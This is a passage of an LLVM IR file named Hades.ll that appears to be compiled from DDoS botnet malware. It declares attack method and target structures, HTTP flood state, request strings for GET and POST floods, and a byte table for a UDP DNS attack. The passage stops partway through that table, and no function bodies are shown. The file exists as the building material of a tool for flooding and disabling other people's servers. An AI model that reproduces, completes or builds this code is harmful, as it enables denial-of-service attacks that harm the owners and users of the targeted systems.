; ModuleID = 'host/ir_O3/Hades.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.attack_http_state = type { i32, i8, i32, i32, i32, [512 x i8], [257 x i8], [129 x i8], [513 x i8], [9 x i8], [9 x i8], i32, i32, i32, i32, i32, [5 x [128 x i8]], i32, [1024 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }

@methods_len = local_unnamed_addr global i8 0, align 1
@methods = local_unnamed_addr global %struct.attack_method** null, align 8
@attack_ongoing = local_unnamed_addr global [15 x i32] [i32 3, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0], align 16
@LOCAL_ADDR = common local_unnamed_addr global i32 0, align 4
@.str = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.3 = private unnamed_addr constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"\0D\0AHost: \00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"Cookie: \00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"; \00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"http\00", align 1
@.str.11 = private unnamed_addr constant [5 x i8] c"url=\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"POST\00", align 1
@.str.15 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.1.16 = private unnamed_addr constant [2 x i8] c"\01\00", align 1
@.str.2.17 = private unnamed_addr constant [2 x i8] c"\02\00", align 1
@.str.3.18 = private unnamed_addr constant [2 x i8] c"\03\00", align 1
@.str.4.19 = private unnamed_addr constant [2 x i8] c"\04\00", align 1
@.str.5.20 = private unnamed_addr constant [2 x i8] c"\05\00", align 1
@.str.6.21 = private unnamed_addr constant [2 x i8] c"\06\00", align 1
@.str.7.22 = private unnamed_addr constant [2 x i8] c"\07\00", align 1
@.str.8.23 = private unnamed_addr constant [2 x i8] c"\08\00", align 1
@.str.9.24 = private unnamed_addr constant [2 x i8] c"\09\00", align 1
@.str.10.25 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.11.26 = private unnamed_addr constant [2 x i8] c"\0B\00", align 1
@.str.12.27 = private unnamed_addr constant [2 x i8] c"\0C\00", align 1
@.str.13.28 = private unnamed_addr constant [2 x i8] c"\0D\00", align 1
@.str.14.29 = private unnamed_addr constant [2 x i8] c"\0E\00", align 1
@.str.15.30 = private unnamed_addr constant [2 x i8] c"\0F\00", align 1
@.str.16 = private unnamed_addr constant [2 x i8] c"\10\00", align 1
@.str.17 = private unnamed_addr constant [2 x i8] c"\11\00", align 1
@.str.18 = private unnamed_addr constant [2 x i8] c"\12\00", align 1
@.str.19 = private unnamed_addr constant [2 x i8] c"\13\00", align 1
@.str.20 = private unnamed_addr constant [2 x i8] c"\14\00", align 1
@.str.21 = private unnamed_addr constant [2 x i8] c"\15\00", align 1
@.str.22 = private unnamed_addr constant [2 x i8] c"\16\00", align 1
@.str.23 = private unnamed_addr constant [2 x i8] c"\17\00", align 1
@.str.24 = private unnamed_addr constant [2 x i8] c"\18\00", align 1
@.str.25 = private unnamed_addr constant [2 x i8] c"\19\00", align 1
@.str.26 = private unnamed_addr constant [2 x i8] c"\1A\00", align 1
@.str.27 = private unnamed_addr constant [2 x i8] c"\1B\00", align 1
@.str.28 = private unnamed_addr constant [2 x i8] c"\1C\00", align 1
@.str.29 = private unnamed_addr constant [2 x i8] c"\1D\00", align 1
@.str.30 = private unnamed_addr constant [2 x i8] c"\1E\00", align 1
@.str.31 = private unnamed_addr constant [2 x i8] c"\1F\00", align 1
@.str.32 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.33 = private unnamed_addr constant [2 x i8] c"!\00", align 1
@.str.34 = private unnamed_addr constant [2 x i8] c"\22\00", align 1
@.str.35 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@.str.36 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.37 = private unnamed_addr constant [2 x i8] c"%\00", align 1
@.str.38 = private unnamed_addr constant [2 x i8] c"&\00", align 1
@.str.39 = private unnamed_addr constant [2 x i8] c"'\00", align 1
@.str.40 = private unnamed_addr constant [2 x i8] c"(\00", align 1
@.str.41 = private unnamed_addr constant [2 x i8] c")\00", align 1
@.str.42 = private unnamed_addr constant [2 x i8] c"*\00", align 1
@.str.43 = private unnamed_addr constant [2 x i8] c"+\00", align 1
@.str.44 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.45 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.46 = private unnamed_addr constant [2 x i8] c".\00", align 1
@.str.47 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.48 = private unnamed_addr constant [2 x i8] c"0\00", align 1
@.str.49 = private unnamed_addr constant [2 x i8] c"1\00", align 1
@.str.50 = private unnamed_addr constant [2 x i8] c"2\00", align 1
@.str.51 = private unnamed_addr constant [2 x i8] c"3\00", align 1
@.str.52 = private unnamed_addr constant [2 x i8] c"4\00", align 1
@.str.53 = private unnamed_addr constant [2 x i8] c"5\00", align 1
@.str.54 = private unnamed_addr constant [2 x i8] c"6\00", align 1
@.str.55 = private unnamed_addr constant [2 x i8] c"7\00", align 1
@.str.56 = private unnamed_addr constant [2 x i8] c"8\00", align 1
@.str.57 = private unnamed_addr constant [2 x i8] c"9\00", align 1
@.str.58 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.59 = private unnamed_addr constant [2 x i8] c";\00", align 1
@.str.60 = private unnamed_addr constant [2 x i8] c"<\00", align 1
@.str.61 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@.str.62 = private unnamed_addr constant [2 x i8] c">\00", align 1
@.str.63 = private unnamed_addr constant [2 x i8] c"?\00", align 1
@.str.64 = private unnamed_addr constant [2 x i8] c"@\00", align 1
@.str.65 = private unnamed_addr constant [2 x i8] c"A\00", align 1
@.str.66 = private unnamed_addr constant [2 x i8] c"B\00", align 1
@.str.67 = private unnamed_addr constant [2 x i8] c"C\00", align 1
@.str.68 = private unnamed_addr constant [2 x i8] c"D\00", align 1
@.str.69 = private unnamed_addr constant [2 x i8] c"E\00", align 1
@.str.70 = private unnamed_addr constant [2 x i8] c"F\00", align 1
@.str.71 = private unnamed_addr constant [2 x i8] c"G\00", align 1
@.str.72 = private unnamed_addr constant [2 x i8] c"H\00", align 1
@.str.73 = private unnamed_addr constant [2 x i8] c"I\00", align 1
@.str.74 = private unnamed_addr constant [2 x i8] c"J\00", align 1
@.str.75 = private unnamed_addr constant [2 x i8] c"K\00", align 1
@.str.76 = private unnamed_addr constant [2 x i8] c"L\00", align 1
@.str.77 = private unnamed_addr constant [2 x i8] c"M\00", align 1
@.str.78 = private unnamed_addr constant [2 x i8] c"N\00", align 1
@.str.79 = private unnamed_addr constant [2 x i8] c"O\00", align 1
@.str.80 = private unnamed_addr constant [2 x i8] c"P\00", align 1
@.str.81 = private unnamed_addr constant [2 x i8] c"Q\00", align 1
@.str.82 = private unnamed_addr constant [2 x i8] c"R\00", align 1
@.str.83 = private unnamed_addr constant [2 x i8] c"S\00", align 1
@.str.84 = private unnamed_addr constant [2 x i8] c"T\00", align 1
@.str.85 = private unnamed_addr constant [2 x i8] c"U\00", align 1
@.str.86 = private unnamed_addr constant [2 x i8] c"V\00", align 1
@.str.87 = private unnamed_addr constant [2 x i8] c"W\00", align 1
@.str.88 = private unnamed_addr constant [2 x i8] c"X\00", align 1
@.str.89 = private unnamed_addr constant [2 x i8] c"Y\00", align 1
@.str.90 = private unnamed_addr constant [2 x i8] c"Z\00", align 1
@.str.91 = private unnamed_addr constant [2 x i8] c"[\00", align 1
@.str.92 = private unnamed_addr constant [2 x i8] c"\5C\00", align 1
@.str.93 = private unnamed_addr constant [2 x i8] c"]\00", align 1
@.str.94 = private unnamed_addr constant [2 x i8] c"^\00", align 1
@.str.95 = private unnamed_addr constant [2 x i8] c"_\00", align 1
@.str.96 = private unnamed_addr constant [2 x i8] c"`\00", align 1
@.str.97 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.98 = private unnamed_addr constant [2 x i8] c"b\00", align 1
@.str.99 = private unnamed_addr constant [2 x i8] c"c\00", align 1
@.str.100 = private unnamed_addr constant [2 x i8] c"d\00", align 1
@.str.101 = private unnamed_addr constant [2 x i8] c"e\00", align 1
@.str.102 = private unnamed_addr constant [2 x i8] c"f\00", align 1
@.str.103 = private unnamed_addr constant [2 x i8] c"g\00", align 1
@.str.104 = private unnamed_addr constant [2 x i8] c"h\00", align 1
@.str.105 = private unnamed_addr constant [2 x i8] c"i\00", align 1
@.str.106 = private unnamed_addr constant [2 x i8] c"j\00", align 1
@.str.107 = private unnamed_addr constant [2 x i8] c"k\00", align 1
@.str.108 = private unnamed_addr constant [2 x i8] c"l\00", align 1
@.str.109 = private unnamed_addr constant [2 x i8] c"m\00", align 1
@.str.110 = private unnamed_addr constant [2 x i8] c"n\00", align 1
@.str.111 = private unnamed_addr constant [2 x i8] c"o\00", align 1
@.str.112 = private unnamed_addr constant [2 x i8] c"p\00", align 1
@.str.113 = private unnamed_addr constant [2 x i8] c"q\00", align 1
@.str.114 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.115 = private unnamed_addr constant [2 x i8] c"s\00", align 1
@.str.116 = private unnamed_addr constant [2 x i8] c"t\00", align 1
@.str.117 = private unnamed_addr constant [2 x i8] c"u\00", align 1
@.str.118 = private unnamed_addr constant [2 x i8] c"v\00", align 1
@.str.119 = private unnamed_addr constant [2 x i8] c"w\00", align 1
@.str.120 = private unnamed_addr constant [2 x i8] c"x\00", align 1
@.str.121 = private unnamed_addr constant [2 x i8] c"y\00", align 1
@.str.122 = private unnamed_addr constant [2 x i8] c"z\00", align 1
@.str.123 = private unnamed_addr constant [2 x i8] c"{\00", align 1
@.str.124 = private unnamed_addr constant [2 x i8] c"|\00", align 1
@.str.125 = private unnamed_addr constant [2 x i8] c"}\00", align 1
@.str.126 = private unnamed_addr constant [2 x i8] c"~\00", align 1
@.str.127 = private unnamed_addr constant [2 x i8] c"\7F\00", align 1
@.str.128 = private unnamed_addr constant [2 x i8] c"\80\00", align 1
@.str.129 = private unnamed_addr constant [2 x i8] c"\81\00", align 1
@.str.130 = private unnamed_addr constant [2 x i8] c"\82\00", align 1
@.str.131 = private unnamed_addr constant [2 x i8] c"\83\00", align 1
@.str.132 = private unnamed_addr constant [2 x i8] c"\84\00", align 1
@.str.133 = private unnamed_addr constant [2 x i8] c"\85\00", align 1
@.str.134 = private unnamed_addr constant [2 x i8] c"\86\00", align 1
@.str.135 = private unnamed_addr constant [2 x i8] c"\87\00", align 1
@.str.136 = private unnamed_addr constant [2 x i8] c"\88\00", align 1
@.str.137 = private unnamed_addr constant [2 x i8] c"\89\00", align 1
@.str.138 = private unnamed_addr constant [2 x i8] c"\8A\00", align 1
@.str.139 = private unnamed_addr constant [2 x i8] c"\8B\00", align 1
@.str.140 = private unnamed_addr constant [2 x i8] c"\8C\00", align 1
@.str.141 = private unnamed_addr constant [2 x i8] c"\8D\00", align 1
@.str.142 = private unnamed_addr constant [2 x i8] c"\8E\00", align 1
@.str.143 = private unnamed_addr constant [2 x i8] c"\8F\00", align 1
@.str.144 = private unnamed_addr constant [2 x i8] c"\90\00", align 1
@.str.145 = private unnamed_addr constant [2 x i8] c"\91\00", align 1
@.str.146 = private unnamed_addr constant [2 x i8] c"\92\00", align 1
@.str.147 = private unnamed_addr constant [2 x i8] c"\93\00", align 1
@.str.148 = private unnamed_addr constant [2 x i8] c"\94\00", align 1
@.str.149 = private unnamed_addr constant [2 x i8] c"\95\00", align 1
@.str.150 = private unnamed_addr constant [2 x i8] c"\96\00", align 1
@.str.151 = private unnamed_addr constant [2 x i8] c"\97\00", align 1
@.str.152 = private unnamed_addr constant [2 x i8] c"\98\00", align 1
@.str.153 = private unnamed_addr constant [2 x i8] c"\99\00", align 1
@.str.154 = private unnamed_addr constant [2 x i8] c"\9A\00", align 1
@.str.155 = private unnamed_addr constant [2 x i8] c"\9B\00", align 1
@.str.156 = private unnamed_addr constant [2 x i8] c"\9C\00", align 1
@.str.157 = private unnamed_addr constant [2 x i8] c"\9D\00", align 1
@.str.158 = private unnamed_addr constant [2 x i8] c"\9E\00", align 1
@.str.159 = private unnamed_addr constant [2 x i8] c"\9F\00", align 1
@.str.160 = private unnamed_addr constant [2 x i8] c"\A0\00", align 1
@.str.161 = private unnamed_addr constant [2 x i8] c"\A1\00", align 1
@.str.162 = private unnamed_addr constant [2 x i8] c"\A2\00", align 1
@.str.163 = private unnamed_addr constant [2 x i8] c"\A3\00", align 1
@.str.164 = private unnamed_addr constant [2 x i8] c"\A4\00", align 1
@.str.165 = private unnamed_addr constant [2 x i8] c"\A5\00", align 1
@.str.166 = private unnamed_addr constant [2 x i8] c"\A6\00", align 1
@.str.167 = private unnamed_addr constant [2 x i8] c"\A7\00", align 1
@.str.168 = private unnamed_addr constant [2 x i8] c"\A8\00", align 1
@.str.169 = private unnamed_addr constant [2 x i8] c"\A9\00", align 1
@.str.170 = private unnamed_addr constant [2 x i8] c"\AA\00", align 1
@.str.171 = private unnamed_addr constant [2 x i8] c"\AB\00", align 1
@.str.172 = private unnamed_addr constant [2 x i8] c"\AC\00", align 1
@.str.173 = private unnamed_addr constant [2 x i8] c"\AD\00", align 1
@.str.174 = private unnamed_addr constant [2 x i8] c"\AE\00", align 1
@.str.175 = private unnamed_addr constant [2 x i8] c"\AF\00", align 1
@.str.176 = private unnamed_addr constant [2 x i8] c"\B0\00", align 1
@.str.177 = private unnamed_addr constant [2 x i8] c"\B1\00", align 1
@.str.178 = private unnamed_addr constant [2 x i8] c"\B2\00", align 1
@.str.179 = private unnamed_addr constant [2 x i8] c"\B3\00", align 1
@.str.180 = private unnamed_addr constant [2 x i8] c"\B4\00", align 1
@.str.181 = private unnamed_addr constant [2 x i8] c"\B5\00", align 1
@.str.182 = private unnamed_addr constant [2 x i8] c"\B6\00", align 1
@.str.183 = private unnamed_addr constant [2 x i8] c"\B7\00", align 1
@.str.184 = private unnamed_addr constant [2 x i8] c"\B8\00", align 1
@.str.185 = private unnamed_addr constant [2 x i8] c"\B9\00", align 1
@.str.186 = private unnamed_addr constant [2 x i8] c"\BA\00", align 1
@.str.187 = private unnamed_addr constant [2 x i8] c"\BB\00", align 1
@.str.188 = private unnamed_addr constant [2 x i8] c"\BC\00", align 1
@.str.189 = private unnamed_addr constant [2 x i8] c"\BD\00", align 1
@.str.190 = private unnamed_addr constant [2 x i8] c"\BE\00", align 1
@.str.191 = private unnamed_addr constant [2 x i8] c"\BF\00", align 1
@.str.192 = private unnamed_addr constant [2 x i8] c"\C0\00", align 1
@.str.193 = private unnamed_addr constant [2 x i8] c"\C1\00", align 1
@.str.194 = private unnamed_addr constant [2 x i8] c"\C2\00", align 1
@.str.195 = private unnamed_addr constant [2 x i8] c"\C3\00", align 1
@.str.196 = private unnamed_addr constant [2 x i8] c"\C4\00", align 1
@.str.197 = private unnamed_addr constant [2 x i8] c"\C5\00", align 1
@.str.198 = private unnamed_addr constant [2 x i8] c"\C6\00", align 1
@.str.199 = private unnamed_addr constant [2 x i8] c"\C7\00", align 1
@.str.200 = private unnamed_addr constant [2 x i8] c"\C8\00", align 1
@.str.201 = private unnamed_addr constant [2 x i8] c"\C9\00", align 1
@.str.202 = private unnamed_addr constant [2 x i8] c"\CA\00", align 1
@.str.203 = private unnamed_addr constant [2 x i8] c"\CB\00", align 1
@.str.204 = private unnamed_addr constant [2 x i8] c"\CC\00", align 1
@.str.205 = private unnamed_addr constant [2 x i8] c"\CD\00", align 1
@.str.206 = private unnamed_addr constant [2 x i8] c"\CE\00", align 1
@.str.207 = private unnamed_addr constant [2 x i8] c"\CF\00", align 1
@.str.208 = private unnamed_addr constant [2 x i8] c"\D0\00", align 1
@.str.209 = private unnamed_addr constant [2 x i8] c"\D1\00", align 1
@.str.210 = private unnamed_addr constant [2 x i8] c"\D2\00", align 1
@.str.211 = private unnamed_addr constant [2 x i8] c"\D3\00", align 1
@.str.212 = private unnamed_addr constant [2 x i8] c"\D4\00", align 1
@.str.213 = private unnamed_addr constant [2 x i8] c"\D5\00", align 1
@.str.214 = private unnamed_addr constant [2 x i8] c"\D6\00", align 1
@.str.215 = private unnamed_addr constant [2 x i8] c"\D7\00", align 1
@.str.216 = private unnamed_addr constant [2 x i8] c"\D8\00", align 1
@.str.217 = private unnamed_addr constant [2 x i8] c"\D9\00", align 1
@.str.218 = private unnamed_addr constant [2 x i8] c"\DA\00", align 1
@.str.219 = private unnamed_addr constant [2 x i8] c"\DB\00", align 1
@.str.220 = private unnamed_addr constant [2 x i8] c"\DC\00", align 1
@.str.221 = private unnamed_addr constant [2 x i8] c"\DD\00", align 1
@.str.222 = private unnamed_addr constant [2 x i8] c"\DE\00", align 1
@.str.223 = private unnamed_addr constant [2 x i8] c"\DF\00", align 1
@.str.224 = private unnamed_addr constant [2 x i8] c"\E0\00", align 1
@.str.225 = private unnamed_addr constant [2 x i8] c"\E1\00", align 1
@.str.226 = private unnamed_addr constant [2 x i8] c"\E2\00", align 1
@.str.227 = private unnamed_addr constant [2 x i8] c"\E3\00", align 1
@.str.228 = private unnamed_addr constant [2 x i8] c"\E4\00", align 1
@.str.229 = private unnamed_addr constant [2 x i8] c"\E5\00", align 1
@.str.230 = private unnamed_addr constant [2 x i8] c"\E6\00", align 1
@.str.231 = private unnamed_addr constant [2 x i8] c"\E7\00", align 1
@.str.232 = private unnamed_addr constant [2 x i8] c"\E8\00", align 1
@.str.233 = private unnamed_addr constant [2 x i8] c"\E9\00", align 1
@.str.234 = private unnamed_addr constant [2 x i8] c"\EA\00", align 1
@.str.235 = private unnamed_addr constant [2 x i8] c"\EB\00", align 1
@.str.236 = private unnamed_addr constant [2 x i8] c"\EC\00", align 1
@.str.237 = private unnamed_addr constant [2 x i8] c"\ED\00", align 1
@.str.238 = private unnamed_addr constant [2 x i8] c"\EE\00", align 1
@.str.239 = private unnamed_addr constant [2 x i8] c"\EF\00", align 1
@.str.240 = private unnamed_addr constant [2 x i8] c"\F0\00", align 1
@.str.241 = private unnamed_addr constant [2 x i8] c"\F1\00", align 1
@.str.242 = private unnamed_addr constant [2 x i8] c"\F2\00", align 1
@.str.243 = private unnamed_addr constant [2 x i8] c"\F3\00", align 1
@.str.244 = private unnamed_addr constant [2 x i8] c"\F4\00", align 1
@.str.245 = private unnamed_addr constant [2 x i8] c"\F5\00", align 1
@.str.246 = private unnamed_addr constant [2 x i8] c"\F6\00", align 1
@.str.247 = private unnamed_addr constant [2 x i8] c"\F7\00", align 1
@.str.248 = private unnamed_addr constant [2 x i8] c"\F8\00", align 1
@.str.249 = private unnamed_addr constant [2 x i8] c"\F9\00", align 1
@.str.250 = private unnamed_addr constant [2 x i8] c"\FA\00", align 1
@.str.251 = private unnamed_addr constant [2 x i8] c"\FB\00", align 1
@.str.252 = private unnamed_addr constant [2 x i8] c"\FC\00", align 1
@.str.253 = private unnamed_addr constant [2 x i8] c"\FD\00", align 1
@.str.254 = private unnamed_addr constant [2 x i8] c"\FE\00", align 1
@.str.255 = private unnamed_addr constant [2 x i8] c"\FF\00", align 1
@attack_udp_dns.dns_array = private unnamed_addr constant [256 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1.16, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2.17, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3.18, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4.19, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5.20, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.6.21, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.7.22, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.8.23, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9.24, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.10.25, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.11.26, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12.27, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13.28, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14.29, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.15.30, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.110, i32 